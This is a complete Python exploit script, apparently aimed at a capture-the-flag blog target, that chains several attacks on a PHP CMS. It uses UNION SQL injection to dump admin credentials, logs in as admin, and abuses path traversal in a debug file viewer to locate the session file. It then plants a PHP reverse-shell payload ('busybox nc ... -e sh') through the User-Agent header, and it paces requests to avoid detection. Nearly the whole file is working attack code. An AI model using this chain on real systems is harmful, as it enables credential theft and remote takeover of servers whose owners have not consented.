                 
#!/usr/bin/env python3
"""
Bloggy CMS - Advanced Penetration Testing Module
Author: Security Research Team
Version: 2.0.2
License: For authorized testing only
"""

import requests
import sys
import time
import urllib.parse
import re
import base64
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass
from colorama import init, Fore, Back, Style

# Initialize colorama for cross-platform colored output
init(autoreset=True)

@dataclass
class TargetConfiguration:
    """Target configuration container"""
    local_host: str
    local_port: int
    base_domain: str = "http://bloggy.ethical37.com"
    
    @property
    def api_endpoints(self) -> Dict[str, str]:
        return {
            'article': f"{self.base_domain}/post.php",
            'authentication': f"{self.base_domain}/login.php",
            'file_viewer': f"{self.base_domain}/debug.php",
            'admin_panel': f"{self.base_domain}/admin/index.php"
        }

class DatabaseQueryEngine:
    """Handles all database enumeration operations"""
    
    def __init__(self, http_session: requests.Session, endpoints: Dict[str, str]):
        self.http = http_session
        self.targets = endpoints
        self.query_delay = 0.2  # Rate limiting to avoid detection
        
    def _execute_payload(self, sql_payload: str) -> Optional[str]:
        """Execute SQL injection with proper encoding"""
        encoded_payload = urllib.parse.quote(sql_payload, safe='')
        attack_url = f"{self.targets['article']}?slug={encoded_payload}"
        
        try:
            response = self.http.get(attack_url, timeout=10)
            return response.text
        except requests.exceptions.RequestException:
            return None
    
    def _parse_html_response(self, raw_html: str) -> List[str]:
        """Extract clean text from HTML response"""
        if not raw_html:
            return []
        # Remove HTML tags and extract content
        matches = re.findall(r'>([^<]+)<', raw_html)
        return [m.strip() for m in matches if m and m.strip()]
    
    def discover_user_tables(self) -> List[str]:
        """Locate tables containing user data"""
        print(f"\n{Fore.CYAN}[ Module 1 ]{Style.RESET_ALL} Scanning database structure...")
        
        discovered_tables = []
        for offset in range(0, 15):
            injection = f"' union select 1,(select table_name from information_schema.tables where table_schema=database() limit {offset},1),3,4,5,6,7,8,9-- -"
            result = self._execute_payload(injection)
            
            if result:
                extracted_data = self._parse_html_response(result)
                if extracted_data:
                    table_name = extracted_data[0]
                    if 'user' in table_name.lower():
                        discovered_tables.append(table_name)
                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} Located: {table_name}")
            
            time.sleep(self.query_delay)
        
        if not discovered_tables:
            print(f"  {Fore.RED}✗{Style.RESET_ALL} No user tables identified")
        else:
            print(f"  {Fore.YELLOW}ℹ{Style.RESET_ALL} Found {len(discovered_tables)} table(s)")
        
        return discovered_tables
    
    def extract_column_structure(self, table: str) -> List[str]:
        """Extract column structure from specified table"""
        column_list = []
        
        for offset in range(0, 15):
            injection = f"' union select 1,(select column_name from information_schema.columns where table_name='{table}' limit {offset},1),3,4,5,6,7,8,9-- -"
            result = self._execute_payload(injection)
            
            if result:
                extracted_data = self._parse_html_response(result)
                if extracted_data and extracted_data[0] not in column_list and extracted_data[0] != "Post not found.":
                    column_list.append(extracted_data[0])
            
            time.sleep(self.query_delay)
        
        return column_list

class CredentialExtractor:
    """Manages credential extraction and authentication"""
    
    def __init__(self, db_engine: DatabaseQueryEngine):
        self.db = db_engine
        self.stolen_credentials: Dict[str, str] = {}
        
    def locate_auth_columns(self, tables: List[str]) -> Tuple[Optional[str], Optional[str]]:
        """Identify username and password columns"""
        print(f"\n{Fore.CYAN}[ Module 2 ]{Style.RESET_ALL} Analyzing table schemas...")
        
        username_field = None
        password_field = None
        
        for table in tables:
            print(f"  {Fore.YELLOW}→{Style.RESET_ALL} Inspecting: {table}")
            columns = self.db.extract_column_structure(table)
            
            for column in columns:
                col_lower = column.lower()
                if any(x in col_lower for x in ['user', 'name', 'login']):
                    if not username_field or 'username' in col_lower:
                        username_field = column
                if any(x in col_lower for x in ['pass', 'pwd', 'hash', 'password']):
                    if not password_field or 'password' in col_lower:
                        password_field = column
            
            if username_field and password_field:
                print(f"  {Fore.GREEN}✓{Style.RESET_ALL} Identified: {username_field} (user), {password_field} (pass)")
                break
        
        return username_field, password_field
    
    def harvest_admin_credentials(self, tables: List[str], user_col: str, pass_col: str) -> Optional[Dict[str, str]]:
        """Extract admin credentials from database"""
        print(f"\n{Fore.CYAN}[ Module 3 ]{Style.RESET_ALL} Extracting administrator credentials...")
        
        for table in tables:
            injection = f"' union select 1,(select concat({user_col},0x3a,{pass_col}) from {table} where {user_col}='admin' limit 0,1),3,4,5,6,7,8,9-- -"
            result = self.db._execute_payload(injection)
            
            if result:
                extracted_data = self.db._parse_html_response(result)
                if extracted_data and ':' in extracted_data[0]:
                    username, password = extracted_data[0].split(':', 1)
                    if username == 'admin':
                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} Admin credentials recovered!")
                        print(f"    Username: {Fore.YELLOW}{username}{Style.RESET_ALL}")
                        print(f"    Password: {Fore.YELLOW}{password}{Style.RESET_ALL}")
                        return {'username': username, 'password': password}
        
        print(f"  {Fore.RED}✗{Style.RESET_ALL} Admin credentials not found")
        return None

class SessionOperator:
    """Handles session management and exploitation"""
    
    def __init__(self, http_session: requests.Session, target_domain: str):
        self.http = http_session
        self.base = target_domain
        self.session_token: Optional[str] = None
        self.session_file: Optional[str] = None
        
    def login(self, username: str, password: str) -> bool:
        """Perform authentication and capture session"""
        print(f"\n{Fore.CYAN}[ Module 4 ]{Style.RESET_ALL} Establishing authenticated session...")
        
        auth_payload = {'username': username, 'password': password}
        
        try:
            response = self.http.post(
                f"{self.base}/login.php", 
                data=auth_payload, 
                allow_redirects=False
            )
            
            # Extract session ID from cookies
            for cookie in self.http.cookies:
                if cookie.name == 'PHPSESSID':
                    self.session_token = cookie.value
                    print(f"  {Fore.GREEN}✓{Style.RESET_ALL} Session established: {self.session_token[:8]}...")
                    return True
                    
        except requests.exceptions.RequestException as e:
            print(f"  {Fore.RED}✗{Style.RESET_ALL} Authentication failed: {str(e)[:50]}")
        
        return False
    
    def find_session_storage(self) -> str:
        """Determine session file path on server"""
        print(f"\n{Fore.CYAN}[ Module 5 ]{Style.RESET_ALL} Locating session storage...")
        
        # Common PHP session paths
        potential_paths = [
            f"../../../../../../../etc/php/temporary_php_sessions/sess_{self.session_token}",
            f"/tmp/sess_{self.session_token}",
            f"../../../sessions/sess_{self.session_token}",
            f"../../../../../../var/lib/php/sessions/sess_{self.session_token}"
        ]
        
        file_viewer = f"{self.base}/debug.php"
        
        for path in potential_paths:
            test_url = f"{file_viewer}?debug_file={path}"
            try:
                response = self.http.get(test_url, timeout=5)
                if "File not found" not in response.text and response.status_code == 200:
                    print(f"  {Fore.GREEN}✓{Style.RESET_ALL} Session file located: {path}")
                    self.session_file = path
                    return path
            except:
                continue
        
        # Default fallback
        default_path = f"../../../../../../../etc/php/temporary_php_sessions/sess_{self.session_token}"
        print(f"  {Fore.YELLOW}⚠{Style.RESET_ALL} Using default path: {default_path}")
        self.session_file = default_path
        return default_path

class PayloadDeployer:
    """Generates and delivers exploitation payloads"""
    
    def __init__(self, http_session: requests.Session):
        self.http = http_session
        self.rev_shell_template = "<?php system('busybox nc {lhost} {lport} -e sh &'); ?>"
        
    def launch_attack(self, target_url: str, lhost: str, lport: int, session_id: str, session_path: str) -> bool:
        """Deploy payload and trigger reverse shell"""
        print(f"\n{Fore.CYAN}[ Module 6 ]{Style.RESET_ALL} Deploying reverse shell payload...")
        
        malicious_payload = self.rev_shell_template.format(lhost=lhost, lport=lport)
        
        print(f"  {Fore.YELLOW}→{Style.RESET_ALL} Payload size: {len(malicious_payload)} bytes")
        print(f"  {Fore.YELLOW}→{Style.RESET_ALL} Callback: {lhost}:{lport}")
        
        # Prepare the attack request
        attack_headers = {
            'User-Agent': malicious_payload,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        session_cookies = {'PHPSESSID': session_id}
        trigger_url = f"{target_url}/debug.php?debug_file={session_path}"
        
        print(f"  {Fore.YELLOW}→{Style.RESET_ALL} Triggering payload...")
        
        try:
            # This should timeout when shell connects
            self.http.get(trigger_url, headers=attack_headers, cookies=session_cookies, timeout=3)
            print(f"  {Fore.GREEN}✓{Style.RESET_ALL} Payload delivered")
            return True
        except requests.exceptions.ReadTimeout:
            # Timeout indicates successful shell connection
            print(f"\n  {Fore.GREEN}{'='*50}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}🔥 REVERSE SHELL ESTABLISHED 🔥{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}{'='*50}{Style.RESET_ALL}")
            print(f"  Check your listener on {lhost}:{lport}")
            return True
        except Exception as e:
            print(f"  {Fore.RED}✗{Style.RESET_ALL} Deployment failed: {str(e)}")
            return False

class PenetrationTester:
    """Main orchestration class"""
    
    def __init__(self, callback_ip: str, callback_port: int):
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.config = TargetConfiguration(callback_ip, callback_port)
        self.http_client = requests.Session()
        self.http_client.headers.update({'User-Agent': 'Mozilla/5.0 (Security Research Tool)'})
        
        # Initialize components
        self.database_engine = DatabaseQueryEngine(self.http_client, self.config.api_endpoints)
        self.credential_harvester = CredentialExtractor(self.database_engine)
        self.session_handler = SessionOperator(self.http_client, self.config.base_domain)
        self.payload_launcher = PayloadDeployer(self.http_client)
        
        # Store discovered data
        self.user_tables = []
        self.admin_creds = None
        self.username_column = None
        self.password_column = None
        self.session_path = None
        
    def show_banner(self):
        """Display tool banner"""
        banner = f"""
{Fore.CYAN}╔{'═'*60}╗
║  Bloggy CMS Security Assessment Tool                ║
║  Target: {self.config.base_domain:<36} ║
║  Callback: {self.callback_ip}:{self.callback_port:<32} ║
║  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<40} ║
╚{'═'*60}╝{Style.RESET_ALL}
        """
        print(banner)
    
    def execute_assessment(self):
        """Execute the complete assessment workflow"""
        self.show_banner()
        
        # Phase 1: Database enumeration
        self.user_tables = self.database_engine.discover_user_tables()
        if not self.user_tables:
            print(f"\n{Fore.RED}[!] Assessment failed at Phase 1{Style.RESET_ALL}")
            return False
        
        # Phase 2: Column identification
        self.username_column, self.password_column = self.credential_harvester.locate_auth_columns(self.user_tables)
        if not self.username_column or not self.password_column:
            print(f"\n{Fore.RED}[!] Assessment failed at Phase 2{Style.RESET_ALL}")
            return False
        
        # Phase 3: Credential extraction
        self.admin_creds = self.credential_harvester.harvest_admin_credentials(
            self.user_tables, 
            self.username_column, 
            self.password_column
        )
        if not self.admin_creds:
            print(f"\n{Fore.RED}[!] Assessment failed at Phase 3{Style.RESET_ALL}")
            return False
        
        # Phase 4: Authentication
        if not self.session_handler.login(self.admin_creds['username'], self.admin_creds['password']):
            print(f"\n{Fore.RED}[!] Assessment failed at Phase 4{Style.RESET_ALL}")
            return False
        
        # Phase 5: Session analysis
        self.session_path = self.session_handler.find_session_storage()
        
        # Wait for listener
        print(f"\n{Fore.YELLOW}[!] ACTION REQUIRED{Style.RESET_ALL}")
        print(f"    Start a netcat listener: {Fore.CYAN}nc -lvnp {self.callback_port}{Style.RESET_ALL}")
        input(f"    {Fore.YELLOW}Press ENTER when listener is ready...{Style.RESET_ALL}")
        
        # Phase 6: Exploitation
        exploitation_success = self.payload_launcher.launch_attack(
            self.config.base_domain,
            self.callback_ip,
            self.callback_port,
            self.session_handler.session_token,
            self.session_path
        )
        
        # Final report
        print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
        if exploitation_success:
            print(f"{Fore.GREEN}✓ Assessment completed successfully!{Style.RESET_ALL}")
            print(f"  Check your listener for remote access")
        else:
            print(f"{Fore.YELLOW}⚠ Assessment partially completed{Style.RESET_ALL}")
            print(f"  Admin credentials: {self.admin_creds['password']}")
            print(f"  Session ID: {self.session_handler.session_token}")
        print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
        
        return True

def main():
    """Entry point with argument validation"""
    
    # Custom ASCII banner
    print(f"""
{Fore.MAGENTA}╔══════════════════════════════════════════════════════════╗
║     Bloggy CMS - Advanced Penetration Testing Tool       ║
║     Version 2.0.2 | Ethical Use Only                      ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """)
    
    if len(sys.argv) != 3:
        print(f"""
{Fore.YELLOW}Usage:{Style.RESET_ALL}
  {sys.argv[0]} <LHOST> <LPORT>

{Fore.YELLOW}Parameters:{Style.RESET_ALL}
  LHOST    Your IP address for reverse connection
  LPORT    Port for reverse shell listener

{Fore.YELLOW}Example:{Style.RESET_ALL}
  {sys.argv[0]} 10.12.35.41 4444

{Fore.YELLOW}Note:{Style.RESET_ALL} Ensure your listener is active before Phase 6
        """)
        sys.exit(1)
    
    try:
        callback_host = sys.argv[1]
        callback_port = int(sys.argv[2])
        
        # Validate IP address format (basic check)
        ip_parts = callback_host.split('.')
        if len(ip_parts) != 4 or not all(part.isdigit() for part in ip_parts):
            print(f"{Fore.RED}[!] Invalid IP address format{Style.RESET_ALL}")
            sys.exit(1)
        
        # Validate port range
        if callback_port < 1 or callback_port > 65535:
            print(f"{Fore.RED}[!] Port must be between 1 and 65535{Style.RESET_ALL}")
            sys.exit(1)
        
        tester = PenetrationTester(callback_host, callback_port)
        tester.execute_assessment()
        
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Assessment interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except ValueError:
        print(f"{Fore.RED}[!] Invalid port number{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Critical error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
             
